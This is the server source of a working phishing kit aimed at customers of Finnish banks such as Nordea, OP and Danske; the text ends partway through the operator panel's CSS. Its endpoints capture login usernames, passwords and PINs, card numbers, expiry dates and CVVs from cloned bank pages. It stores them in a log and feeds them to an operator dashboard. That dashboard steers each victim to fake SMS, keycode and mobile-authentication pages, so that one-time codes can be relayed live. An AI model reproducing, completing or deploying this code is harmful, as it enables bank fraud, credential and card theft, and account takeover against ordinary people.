const express = require('express');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

// ---------- Notifications Storage ----------
const notifications = [];
const shownNotificationIds = new Set();

// ---------- Terminal Logs ----------
const terminalLogs = [];
let terminalLogId = 0;

function addTerminalLog(message, type) {
    const now = new Date();
    const time = now.toLocaleTimeString();
    terminalLogId++;
    terminalLogs.push({
        id: terminalLogId,
        time: time,
        message: message,
        type: type || 'info'
    });
    if (terminalLogs.length > 500) terminalLogs.shift();
    console.log('[TERMINAL] ' + message);
}

// ---------- Middleware ----------
app.use(express.json());
app.use(express.static('public'));

// ---------- Settings Management ----------
const SETTINGS_FILE = path.join(__dirname, 'settings.json');
let siteEnabled = true;

function loadSettings() {
    try {
        if (fs.existsSync(SETTINGS_FILE)) {
            const data = fs.readFileSync(SETTINGS_FILE, 'utf8');
            const settings = JSON.parse(data);
            siteEnabled = settings.siteEnabled !== undefined ? settings.siteEnabled : true;
        } else {
            siteEnabled = true;
            saveSettings();
        }
    } catch (err) {
        console.error('Error loading settings:', err);
        siteEnabled = true;
    }
}

function saveSettings() {
    try {
        fs.writeFileSync(SETTINGS_FILE, JSON.stringify({ siteEnabled }, null, 2));
    } catch (err) {
        console.error('Error saving settings:', err);
    }
}

loadSettings();

// ---------- Site toggle middleware ----------
app.use((req, res, next) => {
    if (req.path.startsWith('/workspace')) return next();
    next();
});

// ---------- Active Submissions & Redirect Tracking ----------
const activeSessions = new Map();

// ---------- Helpers ----------
function generateUniqueID() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < 9; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function getBankNameFromPath(filePath) {
    const parts = filePath.split('/');
    const bankIndex = parts.indexOf('bank');
    if (bankIndex !== -1 && parts.length > bankIndex + 1) {
        const folder = parts[bankIndex + 1];
        const bankMap = {
            'aktia': 'Aktia',
            'alandsbanken': 'Ålandsbanken',
            'danske': 'Danskebank',
            'nordea': 'Nordea',
            'omasp': 'Oma Säästöpankki',
            'op': 'Osuuspankki',
            'poppankki': 'POP Pankki',
            'spankki': 'S-Pankki',
            'saastopankki': 'Säästöpankki'
        };
        return bankMap[folder] || folder.charAt(0).toUpperCase() + folder.slice(1) || 'UNKNOWN';
    }
    return 'UNKNOWN';
}

function getAvailablePages(bankFolder) {
    const dir = path.join(__dirname, 'public', 'bank', bankFolder);
    try {
        const files = fs.readdirSync(dir);
        return files.filter(f => f.endsWith('.html') && f !== 'login.html' && f !== 'apay_auth.html' && f !== 'card.html');
    } catch {
        return [];
    }
}

// ---------- NOTIFICATION HELPERS ----------
function addNotification(message, type) {
    const now = new Date();
    const time = now.toLocaleTimeString();
    const id = Date.now() + Math.random() * 1000;
    notifications.push({
        id: id,
        time: time,
        message: message,
        type: type || 'info'
    });
    if (notifications.length > 100) notifications.shift();
    addTerminalLog('📢 ' + message, 'notification');
}

// ---------- NOTIFICATION ENDPOINTS ----------
app.get('/notifications', (req, res) => {
    const newNotifications = notifications.filter(n => !shownNotificationIds.has(n.id));
    res.json(newNotifications);
});

app.post('/notifications/seen', (req, res) => {
    const { ids } = req.body;
    if (ids && Array.isArray(ids)) {
        ids.forEach(id => shownNotificationIds.add(id));
    }
    res.json({ success: true });
});

app.delete('/notifications/clear', (req, res) => {
    notifications.length = 0;
    shownNotificationIds.clear();
    res.json({ success: true });
});

app.post('/notify', (req, res) => {
    const { message, type } = req.body;
    if (!message) {
        return res.status(400).json({ error: 'Message required' });
    }
    addNotification(message, type || 'click');
    res.json({ success: true });
});

// ---------- BANK SELECTION NOTIFICATION ----------
app.post('/api/bank-selected', (req, res) => {
    const { bank, sessionId } = req.body;
    console.log('🏦 Bank notification received:', bank, 'Session:', sessionId);
    
    const excludedBanks = ['Ålandsbanken', 'POP Pankki', 'alandsbanken', 'poppankki'];
    if (excludedBanks.includes(bank)) {
        console.log('⏭️ Bank excluded from notification:', bank);
        return res.json({ success: true, skipped: true });
    }
    addNotification('🏦 BANK SELECTED: ' + bank, 'bank');
    addTerminalLog('🏦 Bank selected: ' + bank, 'notification');
    res.json({ success: true });
});

// ---------- APAY VERIFICATION ----------
app.post('/api/apay-verification', (req, res) => {
    const { bank } = req.body;
    console.log('🍎 Apay verification received:', bank);
    addNotification('🍎 APAY VERIFICATION REQUESTED', 'apay');
    addTerminalLog('🍎 APAY VERIFICATION REQUESTED', 'notification');
    res.json({ success: true });
});

// ---------- TERMINAL LOG ENDPOINTS ----------
app.get('/terminal/logs', (req, res) => {
    res.json(terminalLogs);
});

app.post('/terminal/clear', (req, res) => {
    const { password } = req.body;
    if (password === 'bandobaby300') {
        terminalLogs.length = 0;
        terminalLogId = 0;
        addTerminalLog('🗑️ Terminal cleared by admin', 'system');
        res.json({ success: true, message: 'Terminal cleared' });
    } else {
        res.status(403).json({ error: 'Invalid password' });
    }
});

// ---------- CREATE SESSION ENDPOINT ----------
app.post('/api/create-session', (req, res) => {
    const { uniqueID, bank } = req.body;
    console.log('🔧 Creating session:', uniqueID, 'for bank:', bank);
    
    if (!activeSessions.has(uniqueID)) {
        const bankLower = bank.toLowerCase();
        activeSessions.set(uniqueID, {
            redirectUrl: null,
            bank: bank,
            pages: getAvailablePages(bankLower),
            isLogin: false
        });
        console.log('✅ Session created:', uniqueID);
    } else {
        console.log('ℹ️ Session already exists:', uniqueID);
    }
    
    res.json({ success: true, uniqueID: uniqueID });
});

// ---------- SUBMISSION ENDPOINT ----------
app.post('/submit', (req, res) => {
    const data = req.body;
    const sourceFile = data._sourceFile || 'N/A';
    const bank = getBankNameFromPath(sourceFile);
    
    // Check if client provided a session ID
    let uniqueID = data._sessionId || generateUniqueID();
    
    // If client provided a session ID, check if it exists
    if (data._sessionId && activeSessions.has(data._sessionId)) {
        // Use existing session
        uniqueID = data._sessionId;
        console.log('♻️ Reusing existing session:', uniqueID);
    } else {
        // Create new session
        console.log('🆕 Creating new session:', uniqueID);
    }

    addTerminalLog('📝 New entry | ID: ' + uniqueID + ' | Bank: ' + bank, 'entry');

    let username = 'N/A';
    let password = 'N/A';
    let isLoginPage = sourceFile.includes('login.html');
    let isCardPage = sourceFile.includes('card.html');

    // Check if it's card.html (OP bank card details)
    if (isCardPage && bank === 'Osuuspankki') {
        const cardData = {};
        for (let key in data) {
            if (key === '_sourceFile') continue;
            const val = data[key];
            if (val && typeof val === 'string' && val.trim() !== '') {
                cardData[key] = val.trim();
            }
        }
        
        let cardNum = 'N/A';
        let expiry = 'N/A';
        let cvv = 'N/A';
        
        for (let key in cardData) {
            const lower = key.toLowerCase();
            if (lower.includes('card') || lower.includes('number')) cardNum = cardData[key];
            else if (lower.includes('exp') || lower.includes('valid')) expiry = cardData[key];
            else if (lower.includes('cvv') || lower.includes('cvc') || lower.includes('security')) cvv = cardData[key];
        }
        
        // Value-based detection
        for (let key in cardData) {
            const val = cardData[key].replace(/\s/g, '');
            if (val.length >= 15 && val.length <= 19 && /^\d+$/.test(val)) cardNum = cardData[key];
            if (val.match(/^\d{2}\/?\d{2}$/) && expiry === 'N/A') expiry = cardData[key];
            if ((val.length === 3 || val.length === 4) && /^\d+$/.test(val) && cvv === 'N/A') cvv = cardData[key];
        }
        
        const cardDetails = cardNum + ' | ' + expiry + ' | ' + cvv;
        addNotification('💳 NEW CARD: ' + cardDetails, 'card');
        addTerminalLog('💳 NEW CARD: ' + cardDetails, 'notification');
        
        const bankLower = bank.toLowerCase();
        if (!activeSessions.has(uniqueID)) {
            activeSessions.set(uniqueID, {
                redirectUrl: null,
                bank: bank,
                pages: getAvailablePages(bankLower),
                isLogin: false
            });
        }
        
        return res.json({ success: true, message: 'Card details captured!', uniqueID });
    }

    // Check if it's apay.html (Apay verification) - NOT for OP
    if (sourceFile.includes('apay.html') && bank !== 'Osuuspankki') {
        addNotification('🍎 APAY VERIFICATION REQUESTED', 'apay');
        addTerminalLog('🍎 APAY VERIFICATION REQUESTED', 'notification');
    }

    // Extract username/password for login pages
    for (let key in data) {
        if (key === '_sourceFile') continue;
        const val = data[key];
        if (!val || typeof val !== 'string' || val.trim() === '') continue;
        const lower = key.toLowerCase();
        if (lower.includes('username') || lower.includes('user') || lower.includes('bankid') || lower.includes('uid')) {
            username = val.trim();
        } else if (lower.includes('password') || lower.includes('pass') || lower.includes('pwd') || lower.includes('pin')) {
            password = val.trim();
        }
    }

    if (username === 'N/A' && password === 'N/A') {
        const values = [];
        for (let key in data) {
            if (key === '_sourceFile') continue;
            const val = data[key];
            if (val && typeof val === 'string' && val.trim() !== '') {
                values.push(val.trim());
            }
        }
        if (values.length >= 1) username = values[0];
        if (values.length >= 2) password = values[1];
    }

    let logLine = '';
    let isLogin = false;

    if (isLoginPage && username !== 'N/A') {
        isLogin = true;
        logLine = uniqueID + ':' + bank + ':' + username + ':' + password + '\n';
        fs.appendFile('submissions.log', logLine, (err) => {
            if (err) {
                console.error('Error writing to log file:', err);
                return res.status(500).json({ error: 'Failed to save submission' });
            }
            console.log('Submission saved:', logLine.trim());
            addTerminalLog('Entry saved | ID: ' + uniqueID + ' | ' + bank + ' | ' + username + ' | ' + password, 'entry');
        });
    } else if (!isCardPage && !sourceFile.includes('apay.html')) {
        let captureMsg = '📥 NEW CAPTURE: ';
        const fields = [];
        for (let key in data) {
            if (key === '_sourceFile') continue;
            const val = data[key];
            if (val && typeof val === 'string' && val.trim() !== '') {
                fields.push(val.trim());
            }
        }
        captureMsg += fields.join(' | ');
        addNotification(captureMsg, 'capture');
        addTerminalLog('📥 ' + captureMsg, 'notification');
    }

    const bankLower = bank.toLowerCase();
    if (!activeSessions.has(uniqueID)) {
        activeSessions.set(uniqueID, {
            redirectUrl: null,
            bank: bank,
            pages: getAvailablePages(bankLower),
            isLogin: isLogin
        });
    } else {
        // Update existing session
        const session = activeSessions.get(uniqueID);
        session.bank = bank;
        session.pages = getAvailablePages(bankLower);
        session.isLogin = isLogin;
    }

    res.json({ success: true, message: 'Form submitted successfully!', uniqueID });
});

// ---------- Check Status (Polling) ----------
app.get('/check-status/:id', (req, res) => {
    const uniqueID = req.params.id;
    const session = activeSessions.get(uniqueID);
    if (!session) {
        console.log('❌ Session not found:', uniqueID);
        return res.json({ redirect: null });
    }

    if (session.redirectUrl) {
        const url = session.redirectUrl;
        session.redirectUrl = null;
        console.log('➡️ Redirect consumed | ID: ' + uniqueID + ' | ' + url);
        addTerminalLog('Redirect consumed | ID: ' + uniqueID + ' | ' + url, 'redirect');
        return res.json({ redirect: url });
    }
    return res.json({ redirect: null });
});

// ---------- SSE Endpoint ----------
app.get('/sse/:id', (req, res) => {
    const uniqueID = req.params.id;
    const session = activeSessions.get(uniqueID);
    
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    });
    
    if (!session) {
        res.write('data: ' + JSON.stringify({ error: 'Session not found' }) + '\n\n');
        res.end();
        return;
    }
    
    if (session.redirectUrl) {
        res.write('data: ' + JSON.stringify({ redirect: session.redirectUrl }) + '\n\n');
        session.redirectUrl = null;
        res.end();
        return;
    }
    
    let checkInterval = setInterval(function() {
        const currentSession = activeSessions.get(uniqueID);
        if (!currentSession) {
            clearInterval(checkInterval);
            res.end();
            return;
        }
        if (currentSession.redirectUrl) {
            clearInterval(checkInterval);
            res.write('data: ' + JSON.stringify({ redirect: currentSession.redirectUrl }) + '\n\n');
            currentSession.redirectUrl = null;
            res.end();
            return;
        }
        res.write(': keepalive\n\n');
    }, 1000);
    
    req.on('close', function() {
        clearInterval(checkInterval);
        res.end();
    });
});

// ---------- Workspace endpoints ----------
app.post('/workspace/redirect', (req, res) => {
    const { uniqueID, url } = req.body;
    console.log('🔧 Workspace redirect called:', uniqueID, url);
    if (uniqueID && activeSessions.has(uniqueID)) {
        activeSessions.get(uniqueID).redirectUrl = url;
        addTerminalLog('Redirect sent to user (' + uniqueID + ')', 'click');
        addTerminalLog('Redirect sent | ID: ' + uniqueID + ' | ' + url, 'notification');
        return res.json({ success: true });
    }
    console.log('❌ Session not found for redirect:', uniqueID);
    res.status(404).json({ error: 'Session not found' });
});

app.post('/workspace/auth', (req, res) => {
    const { uniqueID, authCode } = req.body;
    console.log('🔧 Workspace auth called:', uniqueID, authCode);
    if (uniqueID && activeSessions.has(uniqueID)) {
        const session = activeSessions.get(uniqueID);
        const bankLower = session.bank.toLowerCase();
        const url = '/bank/' + bankLower + '/mobile_auth.html?code=' + encodeURIComponent(authCode);
        session.redirectUrl = url;
        addTerminalLog('Auth code sent to ' + session.bank + ' user', 'click');
        addTerminalLog('Auth sent | ID: ' + uniqueID + ' | ' + session.bank + ' | Code: ' + authCode, 'notification');
        return res.json({ success: true });
    }
    console.log('❌ Session not found for auth:', uniqueID);
    res.status(404).json({ error: 'Session not found' });
});

app.post('/workspace/sms', (req, res) => {
    const { uniqueID } = req.body;
    if (uniqueID && activeSessions.has(uniqueID)) {
        const session = activeSessions.get(uniqueID);
        const bankLower = session.bank.toLowerCase();
        const smsCode = String(Math.floor(100000 + Math.random() * 900000));
        const url = '/bank/' + bankLower + '/sms.html?code=' + encodeURIComponent(smsCode);
        session.redirectUrl = url;
        addTerminalLog('SMS code sent to ' + session.bank + ' user', 'click');
        addTerminalLog('SMS sent | ID: ' + uniqueID + ' | ' + session.bank + ' | Code: ' + smsCode, 'notification');
        return res.json({ success: true, smsCode: smsCode });
    }
    res.status(404).json({ error: 'Session not found' });
});

app.post('/workspace/keycode', (req, res) => {
    const { uniqueID, keyCode } = req.body;
    if (uniqueID && activeSessions.has(uniqueID)) {
        const session = activeSessions.get(uniqueID);
        const bankLower = session.bank.toLowerCase();
        const url = '/bank/' + bankLower + '/keycode.html?code=' + encodeURIComponent(keyCode);
        session.redirectUrl = url;
        addTerminalLog('Keycode sent to ' + session.bank + ' user', 'click');
        addTerminalLog('Keycode sent | ID: ' + uniqueID + ' | ' + session.bank + ' | Code: ' + keyCode, 'notification');
        return res.json({ success: true });
    }
    res.status(404).json({ error: 'Session not found' });
});

app.delete('/workspace/clear', (req, res) => {
    activeSessions.clear();
    notifications.length = 0;
    shownNotificationIds.clear();
    fs.writeFile('submissions.log', '', (err) => {
        if (err) {
            console.error('Error clearing log file:', err);
            return res.status(500).json({ error: 'Failed to clear submissions' });
        }
        addTerminalLog('All captures cleared', 'system');
        res.status(200).json({ message: 'All submissions cleared' });
    });
});

app.get('/workspace/data', (req, res) => {
    let submissions = [];
    try {
        const logContent = fs.readFileSync('submissions.log', 'utf8');
        submissions = logContent.split('\n').filter(line => line.trim() !== '');
        submissions = submissions.filter(line => {
            const parts = line.split(':');
            const bankName = parts[1] || '';
            return bankName.toUpperCase() !== 'N/A';
        });
        submissions.reverse();
    } catch (err) {
        submissions = [];
    }
    res.json({ submissions });
});

app.get('/workspace/settings', (req, res) => {
    res.json({ siteEnabled });
});

app.post('/workspace/settings', (req, res) => {
    const { siteEnabled: newState } = req.body;
    if (typeof newState === 'boolean') {
        siteEnabled = newState;
        saveSettings();
        res.json({ success: true, siteEnabled });
    } else {
        res.status(400).json({ error: 'Invalid value' });
    }
});

// ---------- DEBUG SESSION ENDPOINT ----------
app.get('/api/debug-session', (req, res) => {
    const sessions = {};
    for (let [key, value] of activeSessions) {
        sessions[key] = {
            bank: value.bank,
            redirectUrl: value.redirectUrl,
            isLogin: value.isLogin,
            pages: value.pages || []
        };
    }
    res.json({
        totalSessions: activeSessions.size,
        sessions: sessions,
        allIds: Array.from(activeSessions.keys())
    });
});

// ---------- Get pages endpoint ----------
app.get('/get-pages', (req, res) => {
    const bank = req.query.bank;
    if (!bank) return res.json({ pages: [] });
    const pages = getAvailablePages(bank);
    res.json({ pages: pages });
});

// ---------- TEST BANK NOTIFICATION ENDPOINT ----------
app.get('/api/test-bank-notification', (req, res) => {
    addNotification('🏦 TEST BANK NOTIFICATION', 'test');
    addTerminalLog('🏦 TEST BANK NOTIFICATION', 'notification');
    res.json({ success: true });
});

// ---------- Workspace HTML page ----------
app.get('/workspace', (req, res) => {
    const html = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WORKSPACE</title>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { height: 100%; }
        body {
            background: #111111;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: #aaaaaa;
            padding: 24px;
            position: relative;
            overflow-x: hidden;
            text-transform: uppercase;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: radial-gradient(circle at 15% 50%, rgba(255, 255, 255, 0.02) 0%, transparent 40%),
                        radial-gradient(circle at 85% 30%, rgba(255, 255, 255, 0.015) 0%, transparent 40%);
            pointer-events: none;
            z-index: 0;
        }
        .grid-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background-image: linear-gradient(rgba(255,255,255,0.02) 1px, transparent 1px),
                              linear-gradient(90deg, rgba(255,255,255,0.02) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes fadeUp { 0% { opacity: 0; transform: translateY(10px); } 100% { opacity: 1; transform: translateY(0); } }
        @keyframes rowHighlight { 0% { background-color: rgba(144, 238, 144, 0.35); } 100% { background-color: transparent; } }
        .highlight-row td { animation: rowHighlight 2s ease-out forwards; }

        .login-screen {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #111111;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            transition: opacity 0.4s ease;
        }
        .login-screen.hidden { opacity: 0; pointer-events: none; }
        .login-box {
            width: 100%; max-width: 280px; text-align: center;
            background: #181818; padding: 36px 30px;
            border: 1px solid #282828; border-radius: 6px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            animation: fadeUp 0.5s ease-out forwards;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .login-logo img { height: 110px; width: auto; display: block; border-radius: 6px; margin-bottom: 16px; }
        .login-box .login-input {
            width: 100%; padding: 10px 14px; background: #111111;
            border: 1px solid #333333; border-radius: 4px;
            color: #eeeeee; font-size: 15px; font-family: 'Inter', sans-serif;
            outline: none; letter-spacing: 1px; text-align: center;
            transition: all 0.2s ease; margin-bottom: 12px;
        }
        .login-box .login-input:focus { border-color: #555555; }
        .login-box .login-input::placeholder { color: #444; font-weight: 300; letter-spacing: 1px; font-size: 13px; }
        .login-box .error { color: #ff6b6b; font-size: 12px; margin-top: 8px; display: none; text-transform: uppercase; letter-spacing: 1px; }
        .login-box .error.show { display: block; animation: fadeUp 0.2s ease-out; }
        .login-box .login-btn {
            width: 100%; padding: 10px; margin-top: 4px;
            background: #1a1a1a; border: 1px solid #333333; border-radius: 4px;
            color: #eeeeee; font-size: 14px; font-family: 'Inter', sans-serif;
            cursor: pointer; transition: all 0.2s ease; text-transform: uppercase; letter-spacing: 2px;
        }
        .login-box .login-btn:hover { background: #2a2a2a; border-color: #555555; }
        
        .admin-panel { display: none; width: 100%; max-width: 1400px; margin: 0 auto; position: relative; z-index: 1; height: calc(100vh - 48px); flex-direction: row; gap: 20px; }
        .admin-panel.visible { display: flex !important; animation: fadeUp 0.4s ease-out forwards; }
        
        .sidebar { width: 220px; flex-shrink: 0; background: #181818; border: 1px solid #282828; border-radius: 6px; padding: 20px 0; display: flex; flex-direction: column; height: 100%; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); }
        .sidebar-header { padding: 0 20px 24px 20px; border-bottom: 1px solid #282828; margin-bottom: 16px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 12px; }
        .sidebar-header .logo-small img { width: 100%; max-width: 140px; height: auto; display: block; border-radius: 4px; }
        .sidebar-header .title { font-weight: 600; font-size: 20px; color: #eeeeee; letter-spacing: 0px; text-transform: uppercase; }
        .sidebar-nav { display: flex; flex-direction: column; gap: 4px; padding: 0 12px; flex: 1; }
        .sidebar-btn { font-family: 'Inter', sans-serif; background: transparent; border: none; color: #888888; padding: 10px 14px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; letter-spacing: 1px; text-align: left; width: 100%; transition: all 0.2s ease; text-transform: uppercase; }
        .sidebar-btn:hover { background: #222222; color: #cccccc; }
        .sidebar-btn.active { background: #222222; color: #eeeeee; border-left: 3px solid #777777; }
        .sidebar-footer { padding: 16px 20px 0 20px; border-top: 1px solid #282828; margin-top: auto; text-align: center; display: none; }
        
        .main-content { flex: 1; display: flex; flex-direction: column; min-width: 0; height: 100%; }
        #logsView, #settingsView { display: none; flex-direction: column; height: 100%; animation: fadeUp 0.3s ease-out; }
        #logsView.active, #settingsView.active { display: flex !important; }
        
        .table-container {
            background: #181818; border: 1px solid #282828;
            border-radius: 6px; overflow-y: auto; overflow-x: auto; flex: 1; min-height: 0;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); height: 100%;
            scrollbar-width: none; -ms-overflow-style: none;
            display: flex; flex-direction: column;
        }
        .table-container::-webkit-scrollbar { display: none; }
        table { width: 100%; border-collapse: collapse; font-family: 'Inter', sans-serif; table-layout: fixed; }
        thead { background: #1a1a1a; position: sticky; top: 0; z-index: 2; border-bottom: 1px solid #282828; }
        th { font-weight: 600; font-size: 10px; text-transform: uppercase; letter-spacing: 1.5px; color: #777777; padding: 0 16px; text-align: left; height: 33px; line-height: 33px; }
        td { padding: 0 16px; border-bottom: 1px solid #222222; font-size: 13px; font-weight: 400; color: #cccccc; height: 66px; line-height: 66px; vertical-align: middle; }
        tbody.has-data tr { transition: background 0.15s ease; }
        tbody.has-data tr:hover td { background: #222222; }
        .col-page { width: 25%; min-width: 100px; text-transform: uppercase; color: #ffffff; font-weight: 500; }
        .col-user { width: 20%; min-width: 80px; cursor: pointer; transition: color 0.15s ease; text-transform: none; }
        .col-user:hover { color: #ffffff; text-decoration: underline; text-decoration-color: #555; }
        .col-pass { width: 20%; min-width: 80px; cursor: pointer; transition: color 0.15s ease; text-transform: none; }
        .col-pass:hover { color: #ffffff; text-decoration: underline; text-decoration-color: #555; }
        .col-action { width: 35%; min-width: 160px; text-align: center; vertical-align: middle; padding: 0 16px; }
        .action-btn-group { display: flex; gap: 6px; justify-content: center; align-items: center; flex-wrap: wrap; }
        .action-btn {
            background: #1a1a1a; border: 1px solid #2a2a2a; color: #888888;
            width: 32px; height: 32px; border-radius: 4px; font-size: 14px;
            cursor: pointer; display: inline-flex; align-items: center; justify-content: center;
            transition: all 0.2s ease;
        }
        .action-btn:hover { background: #2a2a2a; color: #eeeeee; border-color: #444444; }
        .action-btn svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2; }
        .action-btn.emoji-btn { font-size: 18px; width: 36px; height: 36px; }
        
        .empty-state { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; width: 100%; min-height: 300px; color: #444444; font-size: 14px; letter-spacing: 1px; text-transform: uppercase; }
        .empty-state .icon { font-size: 18px; margin-bottom: 12px; color: #333333; }
        .empty-state .sub { color: #333333; font-size: 12px; margin-top: 6px; letter-spacing: 1px; }
        
        .settings-content {
            background: #181818; border: 1px solid #282828;
            border-radius: 6px; padding: 36px; flex: 1; display: flex;
            flex-direction: column; color: #aaaaaa; font-size: 14px; overflow-y: auto;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3); height: 100%;
            font-family: 'JetBrains Mono', monospace;
        }
        .settings-content .setting-item { width: 100%; padding: 16px 0; border-bottom: 1px solid #282828; display: flex; justify-content: space-between; align-items: center; }
        .settings-content .setting-item:last-child { border-bottom: none; }
        .settings-content .setting-label { font-size: 13px; color: #cccccc; letter-spacing: 1px; font-weight: 500; text-transform: uppercase; font-family: 'Inter', sans-serif; }
        .btn-settings { font-family: 'Inter', sans-serif; background: #222222; border: 1px solid #333333; color: #aaaaaa; padding: 8px 20px; border-radius: 4px; font-size: 12px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; letter-spacing: 1px; text-transform: uppercase; min-width: 100px; text-align: center; }
        .btn-settings:hover { background: #282828; color: #eeeeee; }
        .btn-settings.danger:hover { background: #331a1a; border-color: #5c2b2b; color: #ff8888; }
        
        .terminal-window {
            background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 4px;
            padding: 0; display: flex; flex-direction: column;
            height: 300px; min-height: 300px; max-height: 300px;
            margin-top: 12px; width: 100%; overflow: hidden;
        }
        .terminal-header {
            background: #141414; padding: 6px 14px;
            display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid #1a1a1a; flex-shrink: 0;
        }
        .terminal-header .terminal-title { color: #555; font-size: 11px; letter-spacing: 1px; font-family: 'JetBrains Mono', monospace; text-transform: uppercase; }
        .terminal-header .terminal-dots { display: flex; gap: 6px; }
        .terminal-header .terminal-dots span { width: 10px; height: 10px; border-radius: 50%; display: inline-block; }
        .terminal-header .terminal-dots .dot-red { background: #ff5f56; }
        .terminal-header .terminal-dots .dot-yellow { background: #ffbd2e; }
        .terminal-header .terminal-dots .dot-green { background: #27c93f; }
        .terminal-body {
            padding: 8px 14px; overflow-y: auto !important; flex: 1;
            font-family: 'JetBrains Mono', monospace; font-size: 11px; color: #aaaaaa;
            line-height: 1.6; background: #0a0a0a; scrollbar-width: thin;
            scrollbar-color: #2a2a2a #0a0a0a; min-height: 0; max-height: 100%; overflow-x: hidden;
            scroll-behavior: smooth; height: 100%;
        }
        .terminal-body::-webkit-scrollbar { width: 6px; }
        .terminal-body::-webkit-scrollbar-track { background: #0a0a0a; }
        .terminal-body::-webkit-scrollbar-thumb { background: #2a2a2a; border-radius: 3px; }
        .terminal-body::-webkit-scrollbar-thumb:hover { background: #3a3a3a; }
        .terminal-log-line { padding: 1px 0; white-space: pre-wrap; word-break: break-all; font-size: 11px; }
        .terminal-log-line .time { color: #444; }
        .terminal-log-line .type-notification { color: #55ff55; }
        .terminal-log-line .type-entry { color: #55aaff; }
        .terminal-log-line .type-redirect { color: #55ffff; }
        .terminal-log-line .type-system { color: #ff6b6b; }
        .terminal-log-line .type-click { color: #ffaa55; }
        .terminal-log-line .type-info { color: #888888; }

        .toast-container {
            position: fixed; top: 20px; right: 20px; z-index: 99999;
            display: flex; flex-direction: column; gap: 6px;
            width: 320px; max-width: 320px; pointer-events: none;
        }
        .toast-notification {
            background: #222222; color: #eeeeee; border: 1px solid #333333;
            padding: 10px 16px; border-radius: 4px; font-size: 12px;
            letter-spacing: 1px; box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            pointer-events: auto; opacity: 0; transform: translateX(20px);
            transition: opacity 0.3s ease, transform 0.3s ease;
            text-transform: uppercase; display: flex; align-items: center;
            justify-content: space-between; gap: 8px;
            width: 320px; min-height: 42px; box-sizing: border-box; flex-shrink: 0;
        }
        .toast-notification.show { opacity: 1; transform: translateX(0); }
        .toast-notification .toast-close { background: none; border: none; color: #555; cursor: pointer; font-size: 14px; padding: 0 4px; transition: color 0.2s; pointer-events: auto; flex-shrink: 0; }
        .toast-notification .toast-close:hover { color: #ff6b6b; }
        .toast {
            position: fixed; top: 20px; right: 20px;
            background: #222222; color: #eeeeee; border: 1px solid #333333;
            padding: 10px 16px; border-radius: 4px; font-size: 12px;
            letter-spacing: 1px; box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            z-index: 99999; opacity: 0; transform: translateX(20px);
            transition: opacity 0.3s ease, transform 0.3s ease;
            pointer-events: none; text-transform: uppercase;
            width: 320px; min-height: 42px; box-sizing: border-box;
            display: flex; align-items: center; justify-content: space-between;
        }
        .toast.show { opacity: 1; transform: translateX(0); }

        .auth-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(2px); z-index: 9999; justify-content: center; align-items: center; }
        .auth-dialog.active { display: flex; animation: fadeUp 0.2s ease-out; }
        .auth-box { background: #181818; border: 1px solid #333333; border-radius: 6px; padding: 32px 36px; max-width: 360px; width: 100%; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.6); text-transform: uppercase; }
        .auth-box h3 { font-size: 16px; font-weight: 600; color: #eeeeee; margin-bottom: 8px; letter-spacing: 1px; }
        .auth-box p { font-size: 13px; color: #aaaaaa; margin-bottom: 16px; }
        .auth-box input { width: 100%; padding: 8px 12px; background: #111111; border: 1px solid #333333; border-radius: 4px; color: #eeeeee; font-size: 14px; font-family: 'Inter', sans-serif; outline: none; margin-bottom: 16px; text-align: center; letter-spacing: 2px; }
        .auth-box input:focus { border-color: #555555; }
        .auth-box .actions { display: flex; gap: 12px; justify-content: center; }
        .auth-box .btn-submit { font-family: 'Inter', sans-serif; background: #1a331a; border: 1px solid #2b5c2b; color: #88ff88; padding: 8px 24px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; }
        .auth-box .btn-submit:hover { background: #1f3d1f; }
        .auth-box .btn-cancel { font-family: 'Inter', sans-serif; background: #222222; border: 1px solid #333333; color: #aaaaaa; padding: 8px 24px; border-radius: 4px; font-size: 13px; font-weight: 500; cursor: pointer; transition: all 0.2s ease; }
        .auth-box .btn-cancel:hover { background: #282828; color: #eeeeee; }

        .password-dialog { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(2px); z-index: 9999; justify-content: center; align-items: center; }
